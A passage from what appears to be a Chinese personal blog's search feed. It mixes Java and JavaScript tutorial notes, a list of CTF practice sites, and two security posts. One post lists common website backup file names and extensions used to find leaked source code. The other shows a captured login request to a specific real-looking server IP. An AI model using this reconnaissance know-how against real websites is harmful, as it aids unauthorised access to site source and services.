class="keyword">new</span> CheckingAccount(<span class="number">101</span>);</span><br><span class="line">      System.out.println(<span class="string">&quot;Depositing $500...&quot;</span>);</span><br><span class="line">      c.deposit(<span class="number">500.00</span>);</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;\nWithdrawing $100...&quot;</span>);</span><br><span class="line">         c.withdraw(<span class="number">100.00</span>);</span><br><span class="line">         System.out.println(<span class="string">&quot;\nWithdrawing $600...&quot;</span>);</span><br><span class="line">         c.withdraw(<span class="number">600.00</span>);</span><br><span class="line">      &#125;<span class="keyword">catch</span>(InsufficientFundsException e)</span><br><span class="line">      &#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;Sorry, but you are short $&quot;</span></span><br><span class="line">                                  + e.getAmount());</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译上面三个文件，并运行程序 BankDemo，得到结果如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Depositing $500...</span><br><span class="line"></span><br><span class="line">Withdrawing $100...</span><br><span class="line"></span><br><span class="line">Withdrawing $600...</span><br><span class="line">Sorry, but you are short $200.0</span><br><span class="line">InsufficientFundsException</span><br><span class="line">        at CheckingAccount.withdraw(CheckingAccount.java:25)</span><br><span class="line">        at BankDemo.main(BankDemo.java:13)</span><br></pre></td></tr></table></figure><h2 id="通用异常"><a href="#通用异常" class="headerlink" title="通用异常"></a>通用异常</h2><p>在Java中定义了两种类型的异常和错误。</p><ul><li><strong>JVM(Java虚拟机) 异常：</strong>由 JVM 抛出的异常或错误。例如：NullPointerException 类，ArrayIndexOutOfBoundsException 类，ClassCastException 类。</li><li><strong>程序级异常：</strong>由程序或者API程序抛出的异常。例如 IllegalArgumentException 类，IllegalStateException 类。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用链接</title>
      <link href="/2022/12/04/%E5%B8%B8%E7%94%A8%E9%93%BE%E6%8E%A5/"/>
      <url>/2022/12/04/%E5%B8%B8%E7%94%A8%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="一、编码解码网站"><a href="#一、编码解码网站" class="headerlink" title="一、编码解码网站"></a>一、编码解码网站</h1><ul><li><p><a href="https://ctf.bugku.com/tools.html">Bugku</a> 工具较多，base全家桶、古典、凯撒、栅栏等。</p></li><li><p><a href="https://tool.oschina.net/encrypt?type=3">OSCHINA</a>主要base64、散列/哈希、图片/base64转换<br><em>这两个网站的工具平常够用。</em></p><h1 id="二、离线工具下载"><a href="#二、离线工具下载" class="headerlink" title="#二、离线工具下载"></a>#二、离线工具下载</h1></li><li><p><a href="https://www.ctfhub.com/#/tools">CTF-HUB-TOOL</a>种类多，较为常用。burpsuite、wireshark、图片隐写steg等工具。</p><h1 id="三、CTF练习平台"><a href="#三、CTF练习平台" class="headerlink" title="#三、CTF练习平台"></a>#三、CTF练习平台</h1></li><li><p><a href="https://www.ctfhub.com/#/index">CTF-HUB</a>（题目难度中等）：有自己的技能树，清晰地查看自己所学方向的联系情况。</p></li><li><p><a href="https://adworld.xctf.org.cn/home/index?rwNmOdr=1670120523610">攻防世界</a>（题目有初级到高级，循序渐进）：难度区分有入门，进阶、精通等，适合入门。</p></li><li><p><a href="https://buuoj.cn/challenges">BUU</a>（题目难度高）：大多比赛真题，适合进阶训练。</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Red Dragonfly</title>
      <link href="/2022/04/14/Red-Dragonfly/"/>
      <url>/2022/04/14/Red-Dragonfly/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /DragonFlyServ/Api/webserver/login HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line">Charset: UTF-8</span><br><span class="line">User-Agent: Dalvik/2.1.0 (Linux; U; Android 12; M2012K11AC Build/SKQ1.211006.001)</span><br><span class="line">Host: 218.195.237.156:8029</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Length: 123</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/image-20220414213359081.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Connection: close</span><br><span class="line">Server: Jetty(9.2.10.v20150310)</span><br><span class="line"></span><br><span class="line">&#123;&quot;r&quot;:&quot;1&quot;,&quot;m&quot;:&quot;1&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>备份文件下载</title>
      <link href="/2022/02/10/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"/>
      <url>/2022/02/10/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h1><p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p><h4 id="常见的网站源码备份文件名："><a href="#常见的网站源码备份文件名：" class="headerlink" title="常见的网站源码备份文件名："></a>常见的网站源码备份文件名：</h4><ul><li>web</li><li>website</li><li>backup</li><li>back</li><li>www</li><li>wwwroot</li><li>temp</li></ul><h4 id="常见的网站源码备份文件后缀："><a href="#常见的网站源码备份文件后缀：" class="headerlink" title="常见的网站源码备份文件后缀："></a>常见的网站源码备份文件后缀：</h4><ul><li>tar</li><li>tar.gz</li><li>zip</li><li>rar</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript笔记</title>
      <link href="/2022/01/29/JavaScript%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/01/29/JavaScript%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>JavaScript是一种高级的、解释型的编程语言。JavaScript是一门基于原型、头等函数的语言，是一门多范式的语言，它支持面向对象程序设计，指令式编程，以及函数式编程。在语法结构上，它与C语言有很多相似（例如if条件语句、switch语句、while循环、do-while循环等）。</p><p>JavaScript是一种脚本语言，其源代码在发往客户端执行之前不需经过编译，而是将文本格式的字符代码发送给浏览器由浏览器解释执行。解释型语言的弱点是安全性较差，而且在JavaScript中，如果一条执行不了，那么下面的语言也无法执行。</p><h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><p>HTML 中的脚本必须位于 <code>&lt;script&gt;</code>与<code>&lt;/script&gt;</code>标签之间。脚本可被放置在 HTML 页面的<code>&lt;body&gt;</code>和 <code>&lt;head&gt; </code>部分中。</p><p>如果需要在HTML页面插入JavaScript，应使用<code>&lt;script&gt;</code>和<code>&lt;/script&gt;</code>标签</p><p>脚本可位于 HTML 的<code>&lt;body&gt;</code>或<code>&lt;head&gt;</code>部分中，或者同时存在于两个部分中。还可以把脚本保存在外部文件。</p><p>通常的做法是把函数放入<code>&lt;head&gt;</code>部分中，或者放在页面底部。这样就可以把它们安置到同一处位置，不会干扰页面的内容。</p><h3 id="lt-body-gt-中的JavaScript"><a href="#lt-body-gt-中的JavaScript" class="headerlink" title="&lt;body&gt;中的JavaScript"></a><code>&lt;body&gt;</code>中的JavaScript</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;h1&gt;这是一个标题&lt;/h1&gt;&quot;</span>);</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;p&gt;段落&lt;/p&gt;&quot;</span>);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在例子中，页面加载时，JavaScript向HTML中的<code>&lt;body&gt;</code>写文本</p><h3 id="lt-head-gt-中的JavaScript"><a href="#lt-head-gt-中的JavaScript" class="headerlink" title="&lt;head&gt;中的JavaScript"></a><code>&lt;head&gt;</code>中的JavaScript</h3><p>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>learn JavaScript<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;demo&quot;</span>&gt;</span>Lorem ipsum dolor sit amet consectetur adipisicing elit. Eligendi architecto dolores quasi et odio optio deserunt animi necessitatibus excepturi, nulla voluptas nostrum sed minus nesciunt id commodi molestias recusandae itaque?<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;first()&quot;</span>&gt;</span>一个小小的按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">first</span>(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="javascript">        </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;demo&quot;</span>).innerHTML=<span class="string">&quot;try&quot;</span>;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当按钮被点击时，first函数会被调用。</p><h3 id="外部的JavaScript"><a href="#外部的JavaScript" class="headerlink" title="外部的JavaScript"></a>外部的JavaScript</h3><p>外部 JavaScript 文件的文件扩展名是<code>.js</code>。</p><p>如需使用外部文件，请在<code>&lt;script&gt;</code>标签的 <code>src</code> 属性中设置该<code>.js </code>文件</p><p>例：使用外部的JS文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;test.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h1><p><code>JavaScript</code>中没有用来打印和输出的函数，但是可以通过其他方式来输出数据</p><p>①使用<code>window.alert()</code>弹出警告框</p><p>②使用<code>document.write()</code>将内容写到 HTML 文档中</p><p>③使用<code>innerHTML</code>写入到 HTML 元素</p><p>④使用<code>console.log()</code>写入到浏览器的控制台</p><h2 id="弹出警告框"><a href="#弹出警告框" class="headerlink" title="弹出警告框"></a>弹出警告框</h2><p>使用<code>window.alert()</code></p><p>例：弹出警告框显示<code>123456</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.alert(<span class="number">123456</span>);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="直接写入HTML文档"><a href="#直接写入HTML文档" class="headerlink" title="直接写入HTML文档"></a>直接写入HTML文档</h2><p>使用<code>document.write()</code></p><p>例：在HTML文档写入当前日期（使用<code>Date()</code>）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="built_in">Date</span>());</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="操作HTML元素"><a href="#操作HTML元素" class="headerlink" title="操作HTML元素"></a>操作HTML元素</h2><p>使用<code>innerHTML</code></p><p>从JavaScript中访问某个HTML元素时，使用<code>document.getElementById(id)</code>。用<code>id</code>属性来标识HTML元素，并用<code>innerHTML</code>来获取或插入元素内容</p><p>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;learn&quot;</span>&gt;</span>未修改的段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">&quot;learn&quot;</span>).innerHTML=<span class="string">&quot;已修改的段落&quot;</span>;</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>页面上不显示<code>未修改的段落</code>只显示<code>已修改的段落</code></p><h2 id="写入控制台"><a href="#写入控制台" class="headerlink" title="写入控制台"></a>写入控制台</h2><p>使用<code>console.log()</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">        a=<span class="number">1</span>;</span></span><br><span class="line"><span class="javascript">        b=<span class="number">9</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(a,b);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="number">231</span>);</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20220130112406066.png"></p><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h2 id="字面量"><a href="#字面量" class="headerlink" title="字面量"></a>字面量</h2><p>在编程语言中，一般<strong>固定值</strong>称为字面量，如<code>23.78</code></p><p>字面量分为数字面量、字符串面量、表达式面量、数组面量、对象面量、函数面量</p><p><strong>数字面量</strong>可以是整数或者是小数，或者是科学计数(e)，如<code>3.14</code>、<code>100</code>、<code>123e4</code></p><p><strong>字符串面量</strong>是指使用双引号<code>“”</code>括起来的的字符序列，如<code>“Hello World”</code></p><p><strong>表达式面量</strong>用于计算，如<code>1+9</code>、<code>2*7</code></p><p><strong>数组面量</strong>是定义一个数组，如<code>[200,3213,213,532,231]</code></p><p><strong>对象面量</strong>是定义一个对象，如<code>&#123;firstName:&quot;Edward&quot;, lastName:&quot;lbw&quot;&#125;</code></p><p><strong>函数面量</strong>是定义一个函数，如<code>test(a,b) &#123;return a+b;&#125;</code></p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>JavaScript用关键字<code>var</code>来定义变量,用等号来为变量赋值。如<code>var t=123</code>定义一个变量t，并赋值为123</p><p>PS：JavaScript变量应以字母开头（也可以 以<code>_</code>或<code>$</code>开头）。变量的名称对大小写敏感。</p><h3 id="一条语句，多个变量"><a href="#一条语句，多个变量" class="headerlink" title="一条语句，多个变量"></a>一条语句，多个变量</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> lastname=<span class="string">&quot;Lee&quot;</span>,age=<span class="number">32</span>,job=<span class="string">&quot;worker&quot;</span>;</span><br></pre></td></tr></table></figure><p>横跨多行的声明</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> lastname=<span class="string">&quot;Lee&quot;</span>,</span><br><span class="line">age=<span class="number">32</span>,</span><br><span class="line">job=<span class="string">&quot;worker&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="重新声明JavaScript变量"><a href="#重新声明JavaScript变量" class="headerlink" title="重新声明JavaScript变量"></a>重新声明JavaScript变量</h3><p>如果重新声明 JavaScript 变量，该变量的值不会丢失</p><p>例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> zoom=<span class="string">&quot;style&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> zoom;</span><br></pre></td></tr></table></figure><p>这两条语句执行后，变量zoom的值仍为”style”</p><h2 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h2><p>JavaScript用<strong>赋值运算符</strong>给变量赋值，用<strong>算术运算符</strong>来计算值</p><p>JavaScript语言有多种类型的运算符</p><table><thead><tr><th align="center">类型</th><th align="center">描述</th><th align="center">例子</th></tr></thead><tbody><tr><td align="center">赋值，算术和位运算符</td><td align="center">在 JS 运算符中描述</td><td align="center">=  +  -  *  /</td></tr><tr><td align="center">条件，比较及逻辑运算符</td><td align="center">在 JS 比较运算符中描述</td><td align="center">==  != &lt;  &gt;</td></tr></tbody></table><h2 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h2><p>JavaScript 语句是用分号<code>;</code>分隔</p><h3 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h3><p><strong>if 语句</strong> —— 只有当指定条件为 true 时，使用该语句来执行代码</p><p><strong>if…else 语句</strong> —— 当条件为 true 时执行代码，当条件为 false 时执行其他代码</p><p><strong>if…else if….else 语句</strong>—— 使用该语句来选择多个代码块之一来执行</p><p><strong>switch 语句</strong> —— 使用该语句来选择多个代码块之一来执行</p><p>PS：上述条件语句的用法与C语言相似</p><p>①<strong>if</strong>语句</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(a&gt;b)</span><br><span class="line">&#123;</span><br><span class="line">c=a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>②<strong>if…else</strong>语句</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(a&gt;b)</span><br><span class="line">&#123;</span><br><span class="line">c=a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">c=b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>③<strong>if…else if…else</strong>语句</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(a&gt;b)</span><br><span class="line">&#123;</span><br><span class="line">c=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a&lt;b)</span><br><span class="line">&#123;</span><br><span class="line">c=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">c=a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>④<strong>switch</strong>语句</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(n)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        代码块 <span class="number">1</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        代码块 <span class="number">2</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        代码块 <span class="number">3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><p><strong>for</strong> ——循环代码块一定的次数</p><p><strong>for/in</strong> —— 循环遍历对象的属性</p><p><strong>while</strong> —— 当指定的条件为 true 时循环指定的代码块</p><p><strong>do/while</strong> —— 同样当指定的条件为 true 时循环指定的代码块</p><p>PS：上述条件语句的用法与C语言相似</p><p>①<strong>for</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">n=i*i;</span><br><span class="line">sum=sum+n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>②<strong>for/in</strong></p><p>for/in语句 循环遍历对象的属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person=&#123;<span class="attr">fname</span>:<span class="string">&quot;Edward&quot;</span>,<span class="attr">lname</span>:<span class="string">&quot;Wayne&quot;</span>,<span class="attr">age</span>:<span class="number">36</span>&#125;; </span><br><span class="line"><span class="keyword">for</span> (x <span class="keyword">in</span> person)      <span class="comment">// x 为属性名</span></span><br><span class="line">&#123;</span><br><span class="line">    txt=txt+person[x];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>③<strong>while</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(条件)</span><br><span class="line">&#123;</span><br><span class="line">    需要执行的代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>④<strong>do/while</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    需要执行的代码</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(条件);</span><br></pre></td></tr></table></figure><p>PS：先循环一次，再判断条件。</p><h3 id="break和continue语句"><a href="#break和continue语句" class="headerlink" title="break和continue语句"></a>break和continue语句</h3><h4 id="break语句"><a href="#break语句" class="headerlink" title="break语句"></a>break语句</h4><p>break 语句可用于跳出循环，会继续执行该循环之后的代码（如果有的话）</p><h4 id="continue语句"><a href="#continue语句" class="headerlink" title="continue语句"></a>continue语句</h4><p>*continue 语句中断循环中的迭代，如果出现了指定的条件，然后继续循环中的下一个迭代。</p><h2 id="关键字"><a href="#关键字" class="headerlink" 